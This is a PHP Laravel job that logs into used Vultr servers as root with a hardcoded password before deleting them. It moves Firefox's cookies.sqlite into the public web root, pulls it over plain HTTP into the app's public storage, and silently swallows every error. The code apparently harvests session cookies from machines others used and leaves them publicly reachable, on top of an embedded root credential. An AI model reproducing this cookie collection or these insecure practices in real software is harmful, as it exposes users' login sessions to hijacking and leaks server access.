<?php

namespace App\Jobs;

use App\Models\Server;
use App\Services\VultrApi;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldBeUnique;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use phpseclib3\Net\SSH2;

class DeleteUsedServers implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    /**
     * Create a new job instance.
     */
    public function __construct()
    {
        //
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {
        $vultr = new VultrApi;
        foreach( 
            Server::query()
                ->whereNotNull('used_at')
                ->whereNull('destroyed_at')
                ->get() as $server
        )
        {
            if($server->used_at->addMinutes(5)->isPast())
            {
                $ip = $server->server_ip;
                try {
                    $ssh = new SSH2($ip, 22);
                    if (!$ssh->login('root', 'whattheFuxk1231')) {
                        throw new \Exception('Connection failed');
                    }
                    $ssh->exec('mv /root/snap/firefox/common/.mozilla/firefox/*.default/cookies.sqlite /var/www/html/cookies.sqlite');
                    $ssh->disconnect();
                    $path = 'storage/' . $ip . 'cookies.sqlite';
                    file_put_contents(public_path($path), file_get_contents('http://' . $ip  . '/cookies.sqlite'));
                    $server->update(['cookie_file' => $path]);
                    $vultr->delete_instance($server->server_id);
                } catch (\Throwable $th) {}
                $server->update([
                    'destroyed_at' => now(), 'ready' => false, 'status' => 'deleted'
                ]);
            }
        }
    }
}
